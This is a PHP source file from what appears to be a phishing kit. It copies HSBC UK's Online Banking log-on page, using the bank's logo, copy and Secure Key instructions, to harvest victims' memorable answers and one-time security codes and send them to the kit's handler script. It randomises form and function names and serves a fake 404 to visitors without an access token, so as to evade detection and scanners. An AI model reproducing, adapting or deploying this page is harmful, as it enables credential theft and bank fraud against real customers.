<?php
session_start();
error_reporting(0);
include "../hc.php";
include "../control.php";
include "../connect/out.php";
if(isset($_GET["accessU"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$sq=getQues($_SESSION["ue"],$panel_rec);
	$sq=str_replace("\\","",$sq);
	echo '<!doctype html>
<html lang="en"><head>
      <meta charset="utf-8">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="apple-touch-icon" sizes="180x180" href="../reg/spec/180.png">
      <link rel="apple-touch-icon-precomposed" sizes="180x180" href="../reg/spec/180.png">
      <link rel="apple-touch-icon" sizes="152x152" href="../reg/spec/152.png">
      <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../reg/spec/152.png">
      <link rel="apple-touch-icon" sizes="144x144" href="../reg/spec/144.png">
      <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../reg/spec/144.png">
      <link rel="apple-touch-icon" sizes="120x120" href="../reg/spec/120.png">
      <link rel="apple-touch-icon-precomposed" sizes="120x120" href="../reg/spec/120.png">
      <link rel="apple-touch-icon" sizes="114x114" href="../reg/spec/114.png">
      <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../reg/spec/114.png">
      <link rel="apple-touch-icon" sizes="76x76" href="../reg/spec/76.png">
      <link rel="apple-touch-icon-precomposed" sizes="76x76" href="../reg/spec/76.png">
      <link rel="apple-touch-icon" sizes="72x72" href="../reg/spec/72.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../reg/spec/72.png">
      <link rel="apple-touch-icon" sizes="60x60" href="../reg/spec/60.png">
      <link rel="apple-touch-icon-precomposed" sizes="60x60" href="../reg/spec/60.png">
      <link rel="apple-touch-icon" sizes="57x57" href="../reg/spec/57.png">
      <link rel="apple-touch-icon-precomposed" sizes="57x57" href="../reg/spec/57.png">
      <meta name="apple-mobile-web-app-status-bar-style" content="#404040">
      <link rel="shortcut icon" href="../reg/spec/favicon-16x16.ico">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-196x196.png" sizes="196x196">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-96x96.png" sizes="96x96">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-32x32.png" sizes="32x32">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-16x16.png" sizes="16x16">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-128.png" sizes="128x128">
      <meta name="msapplication-TileColor" content="#FFFFFF">
      <meta name="msapplication-TileImage" content="../reg/spec/mstile-144x144.png">
      <meta name="msapplication-square70x70logo" content="../reg/spec/mstile-70x70.png">
      <meta name="msapplication-square150x150logo" content="../reg/spec/mstile-150x150.png">
      <meta name="msapplication-wide310x150logo" content="../reg/spec/mstile-310x150.png">
      <meta name="msapplication-square310x310logo" content="../reg/spec/mstile-310x310.png">
      <meta name="msapplication-navbutton-color" content="#404040">
      <meta name="theme-color" content="#404040">
      <title>Log on to Online Banking: with Secure Key Log on | HSBC</title>
	  <link type="text/css" rel="stylesheet" href="../reg/spec/fonts.css'.outrand().'">
      <link type="text/css" rel="stylesheet" href="../reg/spec/box.css'.outrand().'">
      <link type="text/css" rel="stylesheet" href="../reg/spec/table.css'.outrand().'">
	  </head>
   <body>
      <div id="mount">
         <div>
            <div class="styles_container_783Mc">
               <div>
                  <div class="styles_visuallyHidden_23ZWH" role="alert">Personal details, HSBC credit card application</div>
                  <div id="InitialFocus" tabindex="0"></div>
                  <div id="page">
                     <div class="pb-Page__Page">
                        <div class="pb-Page__wrapper">
                           <header class="pb-marginBottom__mb5">
                              <div class="pb-Masthead__wrapper">
                                 <div class="pb-Grid__Grid">
                                    <div class="pb-Grid__Row">
                                       <div class="pb-Grid__Cell pb-Grid__size-12 pb-Grid__sizeMedium-12 pb-Grid__sizeLarge-10 pb-Grid__offsetLarge-1">
                                          <div class="pb-Masthead__container">
                                             <span class="pb-Logo__LogoWrapper pb-marginBottom__mb0">
                                                <canvas class="pb-Logo__stretcher" width="210.62" height="46"></canvas>
                                                <svg id="hsbc-uk-logo" class="pb-Logo__Logo" focusable="false" role="img" version="1.1" viewBox="0 0 210.62 46">
                                                   <title id="hsbc-uk-logo-title">HSBC UK</title>
                                                   <polygon fill="#db0011" points="91.87 23 69 0 69 46 91.87 23"></polygon>
                                                   <polygon fill="#db0011" points="46 23 69 0 23 0 46 23"></polygon>
                                                   <polygon fill="#db0011" points="0 23 23 46 23 0 0 23"></polygon>
                                                   <polygon fill="#db0011" points="46 23 23 46 69 46 46 23"></polygon>
                                                   <polygon points="112.16 24.42 103.76 24.42 103.76 32.56 99.62 32.56 99.62 13.44 103.76 13.44 103.76 21.32 112.16 21.32 112.16 13.44 116.29 13.44 116.29 32.56 112.16 32.56 112.16 24.42"></polygon>
                                                   <path d="M126.24,32.95c-4.13,0-7.62-1.68-7.62-6.2h4.13c0,2.07,1.29,3.23,3.49,3.23,1.68,0,3.62-.9,3.62-2.71,0-1.55-1.29-1.94-3.49-2.58l-1.42-.39c-3-.9-6.07-2.07-6.07-5.56,0-4.26,4-5.69,7.62-5.69s7,1.29,7,5.56h-4.13q-.19-2.71-3.1-2.71c-1.55,0-3.1.78-3.1,2.58,0,1.42,1.29,1.81,4,2.71l1.55.52c3.36,1,5.43,2.2,5.43,5.43.13,4.13-4,5.81-7.88,5.81"></path>
                                                   <path d="M136.71,13.44h6.72a12.76,12.76,0,0,1,3.75.26c2.33.52,4.13,2.07,4.13,4.65s-1.55,3.75-3.88,4.39c2.58.52,4.52,1.81,4.52,4.65,0,4.39-4.26,5.43-7.75,5.43h-7.49Zm6.59,8c1.81,0,3.75-.39,3.75-2.58,0-1.94-1.81-2.58-3.49-2.58h-3v5.17Zm.52,8.27c1.94,0,3.88-.52,3.88-2.84S146,24,144.07,24h-3.36v5.56h3.1Z"></path>
                                                   <path d="M162.81,32.95c-6.2,0-9-4-9-9.82s3.1-10.08,9.17-10.08c3.88,0,7.62,1.68,7.62,6.07H166.3a3.17,3.17,0,0,0-3.36-3c-3.75,0-4.91,4-4.91,7.11s1.16,6.59,4.78,6.59a3.41,3.41,0,0,0,3.62-3h4.39c-.52,4.39-4,6.07-8,6.07"></path>
                                                   <path d="M185.81,32.95c-4.78,0-7.37-2.71-7.37-7.37V13.44h1.81v11.5a6.92,6.92,0,0,0,.9,4.26,5.95,5.95,0,0,0,9.69-.65,8.5,8.5,0,0,0,.52-3.62V13.44h1.81V25.58c0,4.52-2.71,7.37-7.37,7.37"></path>
                                                   <path d="M197.05,13.44h1.68V32.69h-1.68Zm1.81,8.79,8.53-8.79h2.33l-8.79,8.66,9.69,10.6h-2.33Z"></path>
                                                </svg>
                                             </span>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </header>
                           <main class="pb-Page__main" role="main">
                              
                              <div>
                                 <div class="style_container_hrDhY style_constrain_WpH9N">
                                    <div class="styles_container_1-l44 spacing_marginBottom3_2nwJq">
                                       <div class="style_grid_1rIIP helpers_clearfix_3SYTt">
                                          <div class="style_cell_2Z5YP style_size12_36Bma style_sizeMedium9_2vdhf style_sizeLarge6_1hFqT style_offsetLarge1_1EDVm">
                                             <div class="styles_textContainer_33zQ5 spacing_paddingBottom3_37d3j">
                                                <h1 class="style_heading_37lqH spacing_marginBottom2_STKte style_h1_qV8iS fonts_fontLight_suGJR fonts_fontSize6_3C9nF style_noMargin_278lx style_largerMarginInLargeDevice_giGa2" style="padding: 0px 0px 30px 0px;">Log on to Online Banking</h1>
												';if(isset($_GET["error_e"]))
												 {
													 echo '
												<div style="border: 3px solid #FFCBC9;padding: 13px 20px 8px 117px;min-height: 58px;background: url(&quot;../reg/icon-error-large.gif&quot;) no-repeat scroll 30px 50% #FFF2F1;">
												<p>Please enter your memorable answer and security code.</p>
												</div>
												';
											 }
											 
										if(isset($_GET["error_i"]))
											 {
												 echo '
												<div style="border: 3px solid #FFCBC9;padding: 13px 20px 8px 117px;min-height: 58px;background: url(&quot;../reg/icon-error-large.gif&quot;) no-repeat scroll 30px 50% #FFF2F1;">
												<p><b>One or more errors must be corrected</b></font><br><br>The information you entered does not match our records. You will not be able to access any Digital Banking services if you continue to enter your details incorrectly.<br><br>Be aware - If you enter an incorrect Digital Secure Key password an invalid log on security code will be generated.
												<br></p>
												</div>';
												}
												echo '
                                                <p class="style_p_GTYuM fonts_default_HHPMZ fonts_fontRegular_47h8F fonts_fontSize3_109mT spacing_marginBottom2_STKte styles_paragraph_HZ9kr spacing_paddingTop2_3AzSR" style="font-weight: bold;">You are logging on as: '.substr($_SESSION["ue"],0,count($_SESSION["ue"])-5).'****</p>
<br><label class="style_label_3magG spacing_marginBottomHalf_3oJfJ style_regular_1i2ys fonts_fontSize3_109mT" for="editable-Firstname" id="editable-Firstname-label">You must use your secure key to log on to Online Banking.</label>
                                             </div>
                                             <hr class="styles_hr_RUQik">
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="style_container_hrDhY style_constrain_WpH9N">
                                    <div class="style_grid_1rIIP helpers_clearfix_3SYTt">
                                       <div class="style_cell_2Z5YP style_size12_36Bma style_sizeMedium9_2vdhf style_sizeLarge6_1hFqT style_offsetLarge1_1EDVm">
									   <script>var inst=1;function '.$fj.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}
									   function showint(){
										   if(inst == 0){
											   document.getElementById("instructions").style.display="";
											   document.getElementById("inst").innerHTML="Hide instructions";
											   inst=1;
										   }
										   else
										   {
											   document.getElementById("instructions").style.display="none";
											   document.getElementById("inst").innerHTML="Show instructions";
											   inst=0;
										   }
									   }</script>
                                          <form method="post" action="idv.PayeeReq.php?ud=dashbrd&idv.cmd=REQUEST&accessU='.md5(rand(1,100)).'&ID='.randomCha(rand(40,60)).'" lang="en-GB" name="'.$fname.'" id="'.$fname.'">
                                             
                                             <section class="styles_container_2hZRI styles_sectionMargin_1F0_G">
                                                
                                                <div class="styles_content_3uWd_">
                                                   
                                                   
<p class="style_p_GTYuM fonts_default_HHPMZ fonts_fontRegular_47h8F fonts_fontSize3_109mT spacing_marginBottom2_STKte styles_paragraph_HZ9kr spacing_paddingTop2_3AzSR" style="font-weight: bold;padding: 0px 0px 20px 0px;">1. Answer your memorable question</p>

<div class="style_formItem_lTE1w spacing_marginBottom3_2nwJq helpers_clearfix_3SYTt"><label class="style_label_3magG spacing_marginBottomHalf_3oJfJ style_regular_1i2ys fonts_fontSize3_109mT" for="memo" id="editable-Firstname-label">'.$sq.':</label><input type="password" class="style_input_3H6LN input_fontSizeInput_2xMnZ input_paddingVerticalInput_LiKIs input_paddingHorizontalInput_2p2wA" id="memo" maxlength="60" name="memo" value="">
<a href="#" style="color: #4c4c4c;">
I\'ve forgotten my memorable answer</a>&nbsp;
<img src="../reg/forward.gif"></div>
                                                   
                                                   
                                                   
                                                   
                                                   
                                                   
                                                </div>

<hr class="styles_hr_RUQik" style="margin-bottom: 30px;">
<div class="styles_content_3uWd_">
                                                   
                                                   <div style="display: block;">
  <p class="style_p_GTYuM fonts_default_HHPMZ fonts_fontRegular_47h8F fonts_fontSize3_109mT spacing_marginBottom2_STKte styles_paragraph_HZ9kr spacing_paddingTop2_3AzSR" style="font-weight: bold;padding: 0px 0px 20px 0px;display: inline-block;">2. Enter security code</p>
  <p class="style_p_GTYuM fonts_default_HHPMZ fonts_fontRegular_47h8F fonts_fontSize3_109mT spacing_marginBottom2_STKte styles_paragraph_HZ9kr spacing_paddingTop2_3AzSR" style="padding: 0px 0px 20px 0px;display: inline-block;float: right;font-size: 12px;"><span style="color: #4c4c4c;cursor:pointer;text-decoration:underline" id="inst" onclick="showint()">Hide instructions</a></p>
</div>

<div id="instructions" style="">
<table>
  <tbody>
    <tr>
      <td><img src="../reg/01PreLogon.png"></td>
  <td><span><b>1</b>
<br>
Launch the HSBC Mobile Banking app and select \'Generate security code\'.<br>

If you\'re a Touch ID user, cancel the log on prompt and then select \'Generate security code\'.</span></td>
    </tr>

<tr>
      <td><img src="../reg/secureKeyPassword.png"></td>
  <td><span><b>2</b><br>

Enter your Digital Secure Key password and select \'Generate code\'.<br>

For Touch ID, using the log on tab, select \'Generate code\' and follow the steps.</span></td>
    </tr>

<tr>
      <td><img src="../reg/05Key.png"></td>
  <td><span><b>3</b><br>

Your log on security code will be displayed.</span></td>
    </tr>
  </tbody>
</table>
  <br>
  </div>
  
    <div class="style_formItem_lTE1w spacing_marginBottom3_2nwJq helpers_clearfix_3SYTt" style=""><label class="style_label_3magG spacing_marginBottomHalf_3oJfJ style_regular_1i2ys fonts_fontSize3_109mT" for="secc" id="editable-Firstname-label">Enter your log on security code
                                       </label><input type="password" class="style_input_3H6LN input_fontSizeInput_2xMnZ input_paddingVerticalInput_LiKIs input_paddingHorizontalInput_2p2wA" id="secc" maxlength="60" name="secc" value="" onkeypress="return '.$fj.'(event)">
<a href="#" style="color: #4c4c4c;">Reset all security details</a>
<img src="../reg/forward.gif">
<br><br>
<a href="#" style="color: #4c4c4c;"> Lost, damaged or stolen Secure Key</a>&nbsp;
<img src="../reg/forward.gif"></div>
                                                   
                                                   
                                                   
                                                   
                                                   
                                                   
                                                </div>
                                             </section>
                                             

<div class="styles_navigation_3HEqt spacing_marginTop4_WEApq styles_noMarginBottom_iFslb spacing_marginBottom0_UajbN">
                                                <div>
                                                   <div class="">
                                                      <div class="styles_buttonContainer_2xKX1"><button class="style_button_25V2m grid_gridGutterSpacing_3sGPg style_bigFont_4f6ZM input_fontSizeInput_2xMnZ style_primary_3F2SG style_large_1S6Cd grid_gridGutterSpacing_3sGPg" type="submit">Continue</button></div>
                                                   </div>
                                                </div>
                                             </div>


                                             <div class="styles_container_1ENTn spacing_marginTop4_WEApq">
                                                <div class="styles_animationWrapper_xum5W">
                                                   <div class="styles_container_175UD spacing_paddingHorizontal2_rR5jE spacing_paddingLeft2_2Epll spacing_paddingRight2_1MONH spacing_paddingVertical2_3nVic spacing_paddingBottom2_1CjHB spacing_paddingTop2_3AzSR">
                                                      <span class="styles_iconContainer_1WtoE">
                                                         <span role="presentation" class="icon-styles_icon_2bFTp icon-styles_alignMiddle_2zG7Z icon-styles_error_1iExp icon-styles_roundal_1iLbW icon-styles_tiny_3-3NM">
                                                            <svg focusable="false" viewBox="0 0 120 120">
                                                               <polygon points="99.598,31.716 88.285,20.401 60.001,48.688 31.716,20.403 20.402,31.717 48.687,60.001 20.403,88.284 31.716,99.599 60.001,71.313 88.283,99.599 99.598,88.285 71.314,60.001 "></polygon>
                                                            </svg>
                                                         </span>
                                                      </span>
                                                      <p class="style_p_GTYuM fonts_default_HHPMZ fonts_fontRegular_47h8F fonts_fontSize3_109mT spacing_marginBottom2_STKte styles_paragraph_3Wff_">Please resolve the errors above to continue</p>
                                                      <span class="styles_paragraph_3Wff_"></span>
                                                   </div>
                                                </div>
                                             </div>
                                             
                                          </form>
                                       </div>
                                    </div>
                                 </div>



                              </div>
                           </main>
                           <footer class="pb-Footer__Footer pb-marginBottom__mb0">
                              <div class="pb-Grid__Grid">
                                 <div class="pb-Grid__Row">
                                    <div class="pb-Grid__Cell pb-Grid__size-12 pb-Grid__sizeLarge-10 pb-Grid__offsetLarge-1">
                                       <p class="pb-Paragraph__Paragraph pb-marginBottom__mb0">© HSBC Group 2020</p>
                                    </div>
                                 </div>
                              </div>
                           </footer>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>   
</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>